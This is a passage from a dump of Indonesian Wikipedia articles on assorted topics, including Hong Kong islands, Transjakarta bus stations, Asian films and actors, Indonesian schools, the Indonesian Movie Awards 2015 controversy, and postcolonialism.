Indonesia diperkirakan memiliki cadangan limonit sebesar 2 miliar ton. LIPI telah dapat mengembangkannya menjadi produk baja berkualitas unggul, untuk mengatasi kekurangan saprolit (bijih nikel berkadar tinggi) yang selama ini diimpor dari luar negeri.




</doc>
<doc id="1753807" url="https://id.wikipedia.org/wiki?curid=1753807" title="Pulau Bersaudara, Hong Kong">
Pulau Bersaudara, Hong Kong

Pulau Bersaudara atau Mo To Chau (Chinese: 磨刀洲, or 大小磨刀洲) terdiri dari dua pulau di Hong Kong, Siu Mo To (atau Saudara Timur, 小磨刀洲) dan Tai Mo To (atau Saudara Barat, 大磨刀洲). Kedua pulau tersebut biasa dilewati pesawat terbang karena dekat dengan Bandar Udara Internasional Hong Kong. Secara administratif, kedua pulau tersebut berada dibawah yurisdiksi Distrik Tuen Mun.

Kelompok kepulauan tersebut berbatasan di bagian utara dengan Pulau Lantau, jalan tengah antara Chek Lap Kok, dimana Bandar Udara Internasional Hong Kong berada, dan Tuen Mun. Saudara Barat dan Saudara Timur masing-masing berukuran panjang 550 m lebar 430 m dan panjang 800 m lebar 180 m 

Sebuah stasiun VOR/DME berada di Siu Mo To.


</doc>
<doc id="1753808" url="https://id.wikipedia.org/wiki?curid=1753808" title="Orang Ketagalan">
Orang Ketagalan

Ketagalan atau Ketangalan () adalah sebuah suku asli Taiwan sekarang yang berada di Pangkalan Taipei. Bahasa mereka sekarang telah punah.

Pada 21 Maret 1996, jalan di depan Gedung Presidensial berganti nama dari "Jalan Hidup Panjang Chiang Kai-shek" (介壽路) menjadi Boulevard Ketagalan (凱達格蘭大道) oleh wali kota Kota Taipei, Chen Shui-bian, untuk mengingat suku tersebut. Rambu lalu lintas melarang sepeda motor dan sepeda dari jalan tersebut lewat pada waktu yang sama.

Distrik Beitou di Kota Taipei terdapat Pusat Kebudayaan Ketagalan, sebuah pusat kebudayaan tentang orang Ketagalan.



</doc>
<doc id="1753810" url="https://id.wikipedia.org/wiki?curid=1753810" title="Breaking the Magician's Code: Magic's Biggest Secrets Finally Revealed">
Breaking the Magician's Code: Magic's Biggest Secrets Finally Revealed

Breaking the Magician's Code: Magic's Biggest Secrets Finally Revealed adalah sebuah serial dari acara televisi dimana metode-metode dibawah trik sulap dan ilusi dibocorkan. Dalam inkarnasi aslinya, serial tersebut terdiri dari empat acara yang ditayangkan pada 1997-1998 di jaringan Fox di Amerika Serikat, dan di Sky dan ITV di Amerika Serikat. Pada 2008-2009, sebuah serial terbaru dari tiga belas acara ditayangkan oleh MyNetworkTV di Amerika Serikat dan ITV4 di Britania Raya. Pada 1 Mei 2012, penayangan ulang musim pertama mulai ditayangkan pada BIO di Amerika Serikat.

Empat acara khusus pertama menampilkan Val Valentino sebagai Pesulap Bertopeng melalui ilusi skala besar dan beberapa trik sulap jarak dekat skala kecil sebelum membocorkan rahasia-rahasia dari trik-tirk tersebut. Ia mengungkapkan identitasnya pada episode ke-empat. Asisten-asistennya juga tak diidentifikasikan dan tidak disebutkan. Mereka adalah Michelle Berube, Denise Holland, Jennifer Lee Keyes, dan Sybil Azur.

Acara-acara tersebut juga tampil di TVB Pearl di Hong Kong, dengan episode pertamanya yang ditayangkan pada 13 Juni 2010. Val Valentino disebut sebagai produser dan Mitch Pileggi disebut sebagai narator, meskipun ia tidak muncul di kamera. Acara tersebut juga ditayangkan di Britania Raya di ITV4, dan di Australia pada 7Two dengan narasi baru oleh Grant Denyer.


</doc>
<doc id="1753812" url="https://id.wikipedia.org/wiki?curid=1753812" title="Prince of Tears">
Prince of Tears

Prince of Tears () adalah sebuah film drama sejarah Taiwan 2009 karya Yonfan. Film tersebut dinominasikan untuk Golden Lion di Festival Film Internasional Venesia ke-66. Film tersebut mengisahkan tentang kisah sebuah keluarga yang terjerumus dalam peristiwa "Teror Putih" yang tragis akibat keadaan politik yang terjadi saat 1950an oleh pemerintah Kuomintang (KMT) setelah mengakuisisi Taiwan pada 1940an.

Film tersebut terpilih sebagai perwakilan Hong Kong untuk Academy Awards untuk Film Berbahasa Asing Terbaik ke-82 pada 2009.





</doc>
<doc id="1753815" url="https://id.wikipedia.org/wiki?curid=1753815" title="Reza Abbasi">
Reza Abbasi

Reza Abbasi, Riza yi-Abbasi atau Reza-e Abbasi, رضا عباسی dalam Persia, biasanya Reza Abbasi juga Aqa Reza (namun lihat dibawah) atau Āqā Riżā Kāshānī (s. 1565–1635) adalah seorang pembuat miniatur Persia utama dari Aliran Isfahan pada masa Safaviyyah, menjalani sebagian besar kariernya berkarya untuk Shah Abbas I. Ia dianggap menjadi master besar terakhir dari miniatur Persia, yang paling dikenal karena miniatur-miniatur tinggalnya untuk "muraqqa" atau album, khususnya figur-figur tunggal dari pemudi cantik.

Riza kemungkinan lahir di Kashan, dengan nama Āqā Riżā Kāshānī yang merupakan salah satu versi namanya; ia juga dikatakan lahir di Mashad, dimana ayahnya, artis miniatur Ali Asghar, tercatat sebagai orang yang bekerja dalam penugasan gubernur, Pangeran Ibrahim Mirza. Setelah pembunuhan Ibrahim, Ali Asghar bergabung dengan toko karya Shah Ismail II di ibu kota Qasvin. Riza mungkin mendapatkan pelatihan dari ayahnya dan bergabung dengan toko karya Shah Abbas I pada usia muda. Pada saat itu, sejumlah komisi kerajaan untuk buku-buku ilustrasi ditinggalkan, dan digantikan oleh miniatur-miniatur album dalam istilah pelayanan yang diberikan kepada seniman-seniman dari toko karya kerajaan.




</doc>
<doc id="1753817" url="https://id.wikipedia.org/wiki?curid=1753817" title="Casper's Scare School">
Casper's Scare School

Casper's Scare School adalah sebuah film TV animasi komputer Amerika 2006 yang dibintangi oleh Casper si Hantu Bersahabat. Film tersebut diproduksi oleh The Harvey Entertainment Company dan dirilis oleh Classic Media dan tayang perdana pada 20 Oktober 2006. Film tersebut memiliki sebuah serial TV dengan nama yang sama pada 2009. Film tersebut juga memiliki sebuah permainan video dengan nama yang sama.

Pada Maret 2011, Ape Entertainment mengumumkan bahwa mereka akan menerbitkan sebuah buku komik "Casper's Scare School" pada permulaan Oktober 2011.



</doc>
<doc id="1753820" url="https://id.wikipedia.org/wiki?curid=1753820" title="Latumeten Stasiun Grogol (Transjakarta)">
Latumeten Stasiun Grogol (Transjakarta)

Latumeten Stasiun Grogol adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Prof. Dr. Latumenten, Grogol, Grogol Petamburan, Jakarta Barat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini diambil dari Stasiun Grogol yang terletak di sebelah barat stasiun BRT.



</doc>
<doc id="1753821" url="https://id.wikipedia.org/wiki?curid=1753821" title="LY-2940094">
LY-2940094

LY-2940094 adalah antagonis selektif dan poten untuk reseptor nociceptin yang sedang dikembangkan oleh Eli Lilly untuk terapi depresi mayor dan ketergantungan alkohol. Sampai dengan 2014, LY-2940094 sedang menjalani uji klinik fase II untuk kedua indikasi tersebut. Sampai saat ini struktur kimia senyawa ini masih belum dipublikasikan.


</doc>
<doc id="1753828" url="https://id.wikipedia.org/wiki?curid=1753828" title="Jembatan Besi (Transjakarta)">
Jembatan Besi (Transjakarta)

Jembatan Besi adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Prof. Dr. Latumenten, Jembatan Besi, Tambora, Jakarta Barat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta. Nama stasiun BRT ini diambil dari kelurahan stasiun BRT ini berada, Jembatan Besi.



</doc>
<doc id="1753836" url="https://id.wikipedia.org/wiki?curid=1753836" title="Zhou Xun">
Zhou Xun

Zhou Xun (kelahiran 18 Oktober 1974) adalah seorang aktris dan penyanyi Tionghoa yang memenangkan gelar "Aktris Terbaik" di Penghargaan Film Hong Kong, Penghargaan Bauhinia Emas, Penghargaan Perhimpunan Kritikus Film Hong Kong, Penghargaan Kuda Emas, Penghargaan Rooster Emas, Penghargaan Ratusan Bunga, Festival du Film de Paris, Penghargaan Kritikus Film Shanghai, Festical Film Pelajar Kolese Beijing dan Penghargaan Film Asia, dan lain-lain. Ia diangkat menjadi salah satu dari "Empat Aktris Dan" di China.

Zhou lahir dari sebuah keluarga kelas menengah di Quzhou, Zhejiang. Ayahnya, Zhou Tianning (), adalah seorang proyeksionis film lokal, dan ibunya, Chen Yiqin (), adalah seorang penjual di sebuah tempat perbelanjaan. Zhou masuk Institut Kesenian Zhejiang untuk pembelajarannya lebih lanjut dalam bidang seni drama,yang bertentangan dengan keinginan orangtuanya, yang menginginkannya lulus dari universitas. Ia berperan dalam film "Strange Tales Amongst Old and Desolate Tombs" pada masa remajanya di sekolah.

Zhou mendapatkan sambutan internasional karena perannya dalam "Suzhou River" (2000) karya Lou Ye dan "Balzac and the Little Chinese Seamstress" (2002) karya Dai Sijie, memenangkan Penghargaan Aktris Terbaik di Festival du Film de Paris ke-15. Pada 2002, ia berperan sebagai Huang Rong, yang menyatukannya dengan bintang televisi "Kaixin Jiuhao" Li Yapeng, yang memerankan Guo Jing, dalam serial televisi 2003 "The Legend of the Condor Heroes". Serial tersebut adalah salah satu tontonan yang paling banyak dilihat di daratan utama China pada tahun tersebut.

Zhou memasuki industri film Hong Kong pada 2005, membintangi dalam film musikal Peter Chan "Perhaps Love". Ia memenangkan penghargaan "Aktris Terbaik" di Penghargaan Film Hong Kong, Penghargaan Perhimpunan Kritikus Film Hong Kong, Penghargaan Bauhinia Emas, Penghargaan Kuda Emas, Festival Film Pelajar Beijing dan Festival Film Pelajar Hangzhou untuk penampilannya. Setelah "Perhaps Love," film berikutnya adalah "The Banquet" karya Feng Xiaogang, di mana ia memerankan peran pendukung. Proyek Zhou berikutnya adalah film "Ming Ming" (2007) karya Susie Au, yang mendapatkan pujian tinggi di Festival Film Internasional Pusan 2006 yang diadakan di Korea Selatan. Pada penayangan perdana film tersebut, ia merilis video musik barunya, yang menampilkan lagu pembuka dari "Ming Ming".

Pada 2008, Zhou membintangi film thriller percintaan "The Equation of Love and Death" karya Cao Baoping sebagai seorang supir taksi. Film tersebut difilmkan di Yunnan. Pada tahun tersebut, ia juga memainkan peran utama dalam "Painted Skin", sebuah remake dari film thriller supernatural klasik dengan judul yang sama. Ia juga tampil dalam film komedi percintaan perkotaan "All About Women" yang disutradarai oleh Tsui Hark.

Pada 2012, Zhou membuat debut Hollywood-nya dalam "Cloud Atlas", dalam peran ganda dalam film tersebut, sebagai Yoona~939, seorang klonengan di distopia 2144 Korea; sebagai Rose, di 2321; dan sebagai Talbot / Manajer Hotel pada 1973.

Selain dari karier aktingnya, Zhou juga telah tampil pada beberapa soundtrack film, seperti "Ming Ming", "Baobei In Love", "Xin Bian Guo Le Xi San Meng You Xian Jing" dan "Perhaps Love". Ia juga telah merilis dua album solo, "Summer" (2003) dan "Come Across" (2005).

Zhou Xun menikah dengan aktor Amerika Archie Kao pada 16 Juli 2014 diatas panggung setelah sebuah acara amal di Hangzhou, China.



</doc>
<doc id="1753837" url="https://id.wikipedia.org/wiki?curid=1753837" title="Ahmad Muqowam">
Ahmad Muqowam

Ahmad Muqowam adalah seorang anggota DPR RI periode 2004-2009 yang lahir di Salatiga pada 1 Desember 1960. Dia telah memiliki seorang istri bernama Titik Rachmawati dan dikaruniai tiga orang anak. Pendidikan terakhir dia adalah S1 Universitas Diponegoro pada tahun 1987. Dia mendapat total 34.835 suara dalam pemilihan legislatif pada tahun 2004.



<references?


</doc>
<doc id="1753838" url="https://id.wikipedia.org/wiki?curid=1753838" title="Laura Cha">
Laura Cha

Laura Cha Shih May-lung(), GBS, JP, adalah seorang pengusaha dan politikus Hong Kong. Ia adalah seorang anggota non-resmi Dewan Eksekutif Hong Kong, Ketua Pasukan Tugas Preparatori pada Dewan Pengembangan Pelayanan Keuangan, dan Ketua Deputi Non-Eksekutif Perusahaan Perbankan Hongkong dan Shanghai.

Cha mendapatkan gelar Bachelor of Arts dari Universitas Wisconsin–Madison dan gelar Juris Doctor dari Sekolah Hukum Universitas Santa Clara. Ia adalah anggota Komite 100, sebuah organisasi kebudayaan dan politik Tionghoa Amerika. Ia mempraktikan hukum pada 1980an di San Francisco dengan Pillsbury Madison and Sutro.

Setela ia kembali ke Hong Kong, Cha melanjutkan praktik hukum dengan Coudert Brothers. Ia bekerja di Komisi Keamanan dan Masa Depan di Hong Kong dari 1991 sampai awal 2001, menjadi Ketua Deputi-nya pada 1998. Ia menjabat sebagai delegasi Hong Kong pada Kongres Rakyat Nasional ke-11, Wakil Ketua Dewan Penasihat Internasional CSRC, Ketua University Grants Committee di Hong Kong, dan anggota Advisory Board of the Millstein Center of Corporate Governance and Performance di Universitas Yale.

Cha menjadi Wakil Ketua Komisi Regulatori Keamanan Tiongkok (CSRC) dari 2001 sampai 2004. Ia dilantik pada jabatan tersebut oleh Dewan Negara Republik Rakyat Tiongkok dan menjadi orang pertama dari luar Tiongkok Daratan yang bergabung dengan Pemerintahan Rakyat Pusat Republik Rakyat Tiongkok pada pangkal wakil menteri. Ia mengembalikan kewarganegaraan AS untuk memegang jabatan tersebut.

Ia dilantik menjadi Direktur HSBC Holdings plc pada 1 Maret 2011.



</doc>
<doc id="1753839" url="https://id.wikipedia.org/wiki?curid=1753839" title="Alone (film 2007)">
Alone (film 2007)

Alone (, atau "Fad", artinya "kembar") adalah sebuah film horor Thai 2007 yang disutradarai oleh Banjong Pisanthanakun dan Parkpoom Wongpoom. "Alone" dibintangi oleh penyanyi pop Thai-Jerman Marsha Wattanapanich dalam peran film pertamanya dalam 15 tahun.'

Alur film tersebut berdasarkan pada buku Agatha Christie, "Elephants Can Remember".

Seperti film Like Pisanthanakun dan Wongpoom sebelumnya "Shutter", "Alone" menempati urutan #1 di Box Office Thai dengan mendapatkan keuntungan sebesar $960,000 sebelum turun ke peringkat #2 dengan keuntungan sebesar $411,043. Dalam total keuntungan film tersebut yang sebesar $2,040,003 di Thailand, film tersebut menjadi film dengan keuntungan tertinggi ke-21 pada tahun tersebut. Secara internasional, film tersebut mendapatkan keuntungan sebesar $9,365,071 di seluruh dunia.


Film sinema India 2012 "Chaarulatha" berdasarkan pada "Alone", dengan Priyamani yang memerankan saudara kembar. Pada Juni 2014, Bipasha Basu menyetujui untuk memerankan saudara kembar dalam adaptasi Hindi "Alone", yang dirilis dengan nama yang sama.



</doc>
<doc id="1753840" url="https://id.wikipedia.org/wiki?curid=1753840" title="New York (film)">
New York (film)

New York adalah sebuah Bollywood 2009 yang disutradarai oleh Kabir Khan, yang diproduksi oleh Aditya Chopra di bawah label Yash Raj Films, dan permainan latarnya oleh Sandeep Srivastava. Efek visual-nya berasal dari Visual Computing Labs, Tata Elxsi Ltd. Film tersebut dibintangi oleh John Abraham, Katrina Kaif, Neil Nitin Mukesh dan Irrfan Khan. "New York" dimulai pada 1999, berakhir pada 2008, dan mengisahkan cerita tiga pelajar yang belajar di Universitas Negara Bagian New York yang fiksi yang kehidupannya berubah karena 9/11 dan akibatnya.


Dirilis pada 10 Juni 2009, soundtrack untuk "New York" dikomposisikan oleh Pritam, Julius Packiam dan Pankaj Awasthi. Lirik-liriknya ditulis oleh Sandeep Shrivastava dan Junaid Wasi.

DVD untuk "New York" dirilis pada 8 Agustus 2009. Joginder Tuteja dari "Bollywood Hungama" memberikan DVD tersebut empat dari lima bintang. DVD tersebut meliputi (namun tidak termasuk yang edisi terbatas) 2.5 jam film fitur khusus seperti: "Making of the Film," "Deleted Scenes," "New York Special – Zoom TV,"
"The New Yorkers – CNN-IBN," dan sejumlah video musik.




</doc>
<doc id="1753856" url="https://id.wikipedia.org/wiki?curid=1753856" title="SMK PGRI Subang">
SMK PGRI Subang

Sekolah Menengah Kejuruan (SMK) PGRI Subang adalah sekolah sekolah menengah tingkat atas berbasis kejuruan yang terletak di Jalan Marsinu No. 7 Kel. Cigadung Kota Subang, Provinsi Jawa Barat. SMK PGRI Subang sekolah yang menyelenggarakan pendidikan kejuruan kelompok teknologi, informasi dan industri.

Kelahiran SMK PGRI Subang (SMEA PGRI Subang) bukan karena
spekulasi atau karena main-main. Tetapi justru lahirnya SMK PGRI Subang pada
saat itu merupakan akibat dari banyaknya calon-calon siswa yang ingin
melanjutkan ke SMK Negeri 1 Subang (SMEA Negeri 1 Subang) di Kabupaten Subang
yang tidak tertampung.

SMK PGRI Subang berdiri mulai tahun pelajaran 1977-1978
dengan kepengurusan saat itu sebagai berikut:

1. Drs. Basiroen HP. sebagai Koordinir,

2. Drs. Momon Soedarmo sebagai Sekretaris,

3. Drs. H. Bambang Sutrisno,
S.E. sebagai Bendahara, dan

4. Keseluruhan Guru-guru yang
pada saat itu merupakan Guru Tetap di SMK Negeri 1 Subang (SMEA Negeri 1 Subang).

Terdapat jurusan yang telah ada yaitu:



</doc>
<doc id="1753857" url="https://id.wikipedia.org/wiki?curid=1753857" title="SMP Negeri 4 Cibitung">
SMP Negeri 4 Cibitung

SMP Negeri 4 Cibitung (SMPN 4 Cibitung) adalah Sekolah Menengah Pertama Negeri yang berada di daerah Kecamatan Bekasi Timur,Kelurahan Wanajaya tepatnya di Jalan perumahan pesona gading Blok I No. 1 DS.Wanajaya Kec.Cibitung.



Profil Sekolah: 
Blog Sekolah: 


</doc>
<doc id="1753862" url="https://id.wikipedia.org/wiki?curid=1753862" title="SMK Negeri 2 Semarang">
SMK Negeri 2 Semarang

SMK Negeri 2 Semarang (dahulu SMEA 1 Semarang) berdiri pada tanggal 26 Juni 1951, berdasarkan SK Menteri Pendidikan dan Kebudayaan No. 2881 / BIII / 51 dengan nama SMEA Negeri Semarang. Pertama kali bertempat di jalan Pattimura Semarang yang sekarang ditempati SMP 6 Semarang.

Berdasarkan Surat Edaran Sekjen Depdikbud nomor: 41007/A.45/OT/1997 tertanggal 3 April 1997 perihal tindak lanjut Keptutusan Menteri Pendidikan dan Kebudayaan Nomor: 034.035 dan 036 / O / 1997 tentang Perubahan Nomenklatur SMP menjadi SLTP, SMA menjadi SMU dan SMKTA menjadi SMK, maka SMEA 1 Semarang namanya berubah menjadi SMK Negeri 2 Semarang.

Sekolah ini termasuk sekolah favorit di Kota semarang, Jawa Tengah. sekolah ini mendapatkan predikat sebagai sekolah Adiwiyata atau sekolah berwawasan lingkungan. dan pada saat ini SMKN 2 Semarang telah berpredikat sekolah Adiwiyata Mandiri.
Banyak prestasi yang telah dihasilkan disekolah ini, baik di bidang akademis maupun non-akademis. Hal ini dibuktikan oleh total 1200 siswa sekolah yang berada di Jl. Dr. Cipto No. 121A Kecamatan Semarang Timur itu pada Kamis, 5 Desember 2013. Bertempat di area lapangan sekolah yang didominasi oleh pelajar siswi, ribuan pelajar siswi berkumpul membuat lukisan dibadan botol bekas.

Tidak sekadar lukis melukis. Tapi motif yang dilukis adalah motif batik yang didaulat sebagai salah satu aset kebudayaan bangsa Indonesia. Tujuannya tentu untuk melestarikan budaya bangsa. Tidak tanggung-tanggung, total 1000 botol bekas berhasil disulap menjadi botol-botol yang cantik karya anak-anak SMKN 2 Semarang.

Dengan kegiatan tersebut, SMKN 2 Semarang dinobatkan oleh Lembaga Prestasi Indonesia-Dunia (Lemprid) 2013 sebagai pemecah rekor nasional untuk kategori“Melukis Eco Creative Pada Botol Terbanyak Bermotif Batik dan Bunga Perca Batik”.

Acara yang dilaksanakan dari pagi hingga siang itu cukup ramai dan meriah. Teriakan warga SMKN 2 Semarang pecah saat para tamu penting seperti Hendrar Prihadi (Wali kota Semarang) beserta sang isteri, Pak Bunyamin (Kadin Kota Semarang) dan Paulus Pangka (Lembaga Prestasi Indonesia-Dunia) memasuki area lapangan SMKN 2.

Tanpa tinggal diam, warga SMKN 2 juga memberikan lukisan bergambar wajah Wali kota Semarang dari bahan pelepah pisang untuk Pak Hendrar dan Isteri pada hari yang bertepatan dengan ulang tahun pernikahannya itu.

"“Saya terkejut sekali mendapatkan hadiah tadi. Sebelumnya tadi pak kepala sekolah sudah bilang sih kalau habis ini akan ada kejutan. Tapi saya malah lebih terkejut pas dengan suara petasan tadi. Hehehe!,”" ucap Hendrar sambil memberi sedikit guyonan.


</doc>
<doc id="1753866" url="https://id.wikipedia.org/wiki?curid=1753866" title="Penjaringan (Transjakarta)">
Penjaringan (Transjakarta)

Penjaringan adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Pluit Raya, Penjaringan, Penjaringan, Jakarta Utara. Stasiun BRT ini merupakan stasiun BRT transfer di Koridor 9 dan 12. Stasiun BRT ini menjadi stasiun BRT terminus Koridor 12 karena stasiun BRT Pluit sudah tidak dilayani lagi oleh Koridor 12.




</doc>
<doc id="1753868" url="https://id.wikipedia.org/wiki?curid=1753868" title="Jembatan Tiga (Transjakarta)">
Jembatan Tiga (Transjakarta)

Jembatan Tiga adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Jembatan Tiga, Kelurahan "pejagalan",kecamatan Penjaringan, Jakarta Utara. Stasiun BRT ini berada di Koridor taman permata indah 1 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1753869" url="https://id.wikipedia.org/wiki?curid=1753869" title="Jembatan Dua (Transjakarta)">
Jembatan Dua (Transjakarta)

Jembatan Dua adalah sebuah stasiun BRT Transjakarta yang terletak di Jalan Prof. Dr. Latumenten, Angke, Tambora, Jakarta Barat. Stasiun BRT ini berada di Koridor 9 yang membentang dari tenggara ke barat laut Jakarta.



</doc>
<doc id="1753875" url="https://id.wikipedia.org/wiki?curid=1753875" title="Ekonomi pascaindustri">
Ekonomi pascaindustri

Ekonomi pascaindustri merujuk pada masa pertumbuhan dalam sebuah ekonomi atau negara industri yang mengalami kelesuan di sektor manufaktur dan pertumbuhan di sektor jasa, informasi, dan riset.
Ekonomi pascaindustri memiliki ciri-ciri sebagai berikut:

Sektor industri dalam ekonomi pascaindustri dialihkan ke negara-negara berkembang yang mampu memproduksi barang dengan biaya rendah (alih daya). Pola ini dapat dijumpai di negara-negara yang sudah terindustrialisasi seperti Amerika Serikat dan sebagian besar negara di Eropa Barat.



</doc>
<doc id="1753876" url="https://id.wikipedia.org/wiki?curid=1753876" title="Indonesian Movie Awards 2015">
Indonesian Movie Awards 2015

Indonesian Movie Awards 2015 adalah penghargaan film Indonesian Movie Awards yang diadakan untuk ke-sembilan kalinya pada hari Senin, 18 Mei 2015 di Balai Sarbini, Jakarta, dengan Nirina Zubir, Ringgo Agus Rahman dan Dennis Adhiswara sebagai pembawa acara. Dan nominasi yang telah diumumkan untuk kategori terfavorit, yang dipilih oleh masyarakat melalui SMS, sedangkan untuk kategori terbaik, dipilih oleh dewan juri yang telah ditunjuk. Pengisi acara IMA 2015 adalah Ridho Rhoma, Ayu Ting Ting, Mieke Wijaya, Willy Dozan, Chelsea Islan, Tatjana Saphira, Vincent Rompies, Desta, dan lainnya.



Indonesian Movie Awards tahun ini memberikan dua penghargaan khusus yakni penghargaan seumur hidup ("lifetime achievement awards") kepada sosok yang dianggap berdedikasi bagi dunia perfilman Indonesia. Penghargaan ini diberikan kepada Mieke Wijaya karena dedikasinya dan totalitasnya dalam perfilman Indonesia. Sementara penghargaan khusus, "special awards" diberikan kepada Alex Komang juga karena dedikasinya dalam dunia perfilman Indonesia.

Perhelatan Indonesian Movie Awards 2015 diwarnai kontroversi saat lagu '"Indonesia Milik Kita Bersama" oleh Angel Pieters dalam kategori Soundtrack Film Teravorit secara tiba-tiba memenangkan kategori penghargaan tersebut, padahal lagu tersebut tidak masuk dalam lima nominasi kategori Soundtrack Terfavorit. Hal tersebut diketahui pertama kali oleh dua pesohor, Pongki Barata dan Glenn Fredly, yang membeberkan beberapa bukti yang menyimpulkan bahwa tidak ada nominasi lagu Angel Pieters dalam nominasi tersebut, ditambah daftar nominasi yang terburu-buru diganti sebelum penganugerahan. Sementara itu, Angel menghapus foto dirinya bersama piala emas yang diunggah ke akun Instagram miliknya karena kontroversi ini. Salah satu juri IMA 2015, Aditya Gumay, mengklarifikasi bahwa dewan juri hanya memegang dan menilai bidang pemeranan, aktor dan aktris utama, pendukung, pendatang baru dan anak. Mereka tidak memiliki kuasa dalam memilih Soundtrack Film Terfavorit. Dalam konferensi pers, Angel mengakui bahwa ia sudah masuk nominasi sejak bulan April 2015 lalu, namun sorotan media sosial atas kemenangannya membuat Angel kaget dan sedih. Pada 23 Mei 2015, Grup MNC merilis hasil perolehan SMS untuk masing-masing nomine. Dari hasil tersebut, Angel unggul telak dibanding para nomine lain.



</doc>
<doc id="1753877" url="https://id.wikipedia.org/wiki?curid=1753877" title="Ole Holsti">
Ole Holsti

Ole Rudolf Holsti (lahir 7 Agustus 1933) adalah ilmuwan politik dan akademisi Amerika Serikat. Ia saat ini menjabat sebagai Dosen Emeritus Ilmu Politik George V. Allen di Universitas Duke. Ia telah menulis beberapa buku tentang hubungan internasional, kebijakan luar negeri Amerika Serikat, analisis isi, pembuatan keputusan dalam politik dan diplomasi, dan krisis.

Holsti mendapatkan gelar Bachelor of Arts dari Universitas Stanfrod pada tahun 1954, Master of Arts in Teaching dari Universitas Wesleyan tahun 1956, dan Ph.D dari Universitas Stanford tahun 1962.

Holsti pernah bekerja di Universitas Stanford sebagai instruktur Departemen Ilmu Politik (1962–1965), koordinator peneliti dan direktur asosiasi Studi Konflik Internasional dan Integrasi (1962–1967), dan dosen pembantu Departemen Ilmu Politik (1965–1967). Ia pindah ke Universitas British Columbia tahun 1967 dan bekerja sebagai dosen pembantu di Departemen Ilmu Politik (1967–1971) sebelum diangkat menjadi dosen purnawaktu (1971–1974).

Holsti kemudian menjadi dosen di Departemen Ilmu Politik Universitas California, Davis (1978–1979) sebelum diangkat sebagai Dosen Ilmu Politik George V. Allen di Universitas Duke (1974–1998). Ia menjadi dosen emeritus pada tahun 1998.

Holsti merupakan adik dari Dosen Emeritus Universitas Killam, Kal (Kalevi) Holsti, dan putra dari mantan Menteri Luar Negeri Finlandia Rudolf Holsti.

"Model keyakinan buruk tersirat" dalam pemrosesan informasi adalah teori psikologi politik yang pertama kali dikemukakan Holsti untuk menjelaskan hubungan antara keyakinan John Foster Dulles dan model pemrosesan informasinya. Model ini merupakan model saingan yang paling banyak dipelajari. Sebuah negara dianggap sebagai musuh, dan segala indikator yang menyatakan sebaliknya justru tidak diakui. Indikator-indikator ini dianggap sebagai propaganda atau tanda kelemahan. Contohnya adalah sikap John Foster Dulles terhadap Uni Soviet, atau sikap awal Israel terhadap Organisasi Pembebasan Palestina.



</doc>
<doc id="1753991" url="https://id.wikipedia.org/wiki?curid=1753991" title="Pascakolonialisme">
Pascakolonialisme

Pascakolonialisme atau studi pascakolonial adalah disiplin akademik dengan metode diskursus intelektual yang mempelajari, menjelaskan, dan menilai warisan budaya kolonialisme dan imperialisme serta dampak kemanusiaan dari penjajahan suatu negara dan permukiman pendatang yang bertujuan memanfaatkan penduduk pribumi dan tanahnya. Diturunkan dari aliran pascamodernisme, studi pascakolonial menganalisis politik pengetahuan (penciptaan, pengendalian, dan penyebaran) dengan mempelajari hubungan fungsional kekuasaan sosial dan politik yang memungkinkan kolonialisme dan neokolonialisme bertahan—persoalan gambaran penjajah dan terjajah (sosial, politik, budaya).

Sebagai genre dari sejarah kontemporer, pascakolonialisme mempertanyakan dan menemukan kembali mode-mode persepsi budaya—cara memandang dan dipandang. Dalam antropologi, pascakolonialisme mempelajari hubungan manusia di negara-negara kolonial dan masyarakat subaltern yang dieksploitasi oleh pemerintahan kolonial. Dalam teori kritis, pascakolonialisme memaparkan, menjelaskan, dan menggambarkan ideologi dan praksis neokolonialisme dengan mengambil contoh dari ilmu-ilmu humaniora—sejarah, dan ilmu politik, filsafat dan teori Marxis, sosiologi, antropologi, dan geografi manusia; perfilman, agama, dan teologi; feminisme, ilmu bahasa, dan sastra pascakolonial, dengan genre anti-penjajahan yang memaparkan kisah-kisah penaklukan orang-orang subaltern pada masa kolonial.

Sebagai suatu epistemologi (studi pengetahuan, sifatnya, dan ketersahkannya), etika (filsafat moral), dan politik (urusan kewarganegaraan), bidang pascakolonialisme menangani politik pengetahuan—permasalahan yang mencakup identitas pascakolonial sebuah bangsa yang mengalami dekolonisasi yang berasal dari: (i) penciptaan pengetahuan budaya tentang bangsa terjajah oleh bangsa penjajah; dan (ii) bagaimana pengetahuan budaya Barat digunakan untuk menundukkan bangsa non-Eropa agar bisa dijadikan koloni negara induk Eropa yang diberlakukan setelah serangan awal lewat identitas budaya "penjajah" dan "terjajah".

Bangsa yang didekolonisasi memiliki identitas pascakolonial yang didapat dari interaksi budaya dengan berbagai macam identitas (budaya, bangsa, etnis) dan hubungan sosial seks, kelas, dan kasta; ditentukan oleh gender dan ras orang terjajah; dan rasisme yang tertanam dalam struktur masyarakat kolonial. Dalam sastra pascakolonial, sikap anti-penjajahannya mempelajari politik identitas yang menjadi sudut pandang sosial dan budaya para penduduk kolonial subaltern—pemberontakannya yang kreatif terhadap kebudayaan penjajah; bagaimana pemberontakan budaya mengganggu pembentukan masyarakat kolonial; bagaimana penjajah mengembangkan identitas pascakolonialnya; dan bagaimana neokolonialisme menggunakan hubungan sosial biner Kami-dan-Mereka untuk memahami bahwa dunia non-Barat dihuni oleh Orang Lain ("The Other").

Diskursus kehomogenan geopolitik dalam neokolonialisme menggabungkan bangsa dekolonial, kebudayaannya, dan negaranya dengan tempat khayalan seperti "Dunia Ketiga", sebuah istilah berlebihan yang biasanya mencakup benua dan lautan, i.e. Afrika, Asia, Amerika Latin, dan Oseania. Kritik pascakolonial mempelajari diskursus neokolonialisme yang membenarkan diri sendiri serta fungsi istilah-istilahnya yang berlebihan (secara filosofis atau politis) untuk menentukan kekurangan konsep-konsep homogen (misalnya "bangsa Arab", "Dunia Pertama", "Dunia Kristen", dan "Dunia Islam") yang sebenarnya terdiri dari bangsa, kebudayaan, dan geografi yang heterogen, dan fakta bahwa penggambaran realistis bangsa, tempat, dan benda di dunia membutuhkan istiilah yang lebih beragam dan akurat.







</doc>
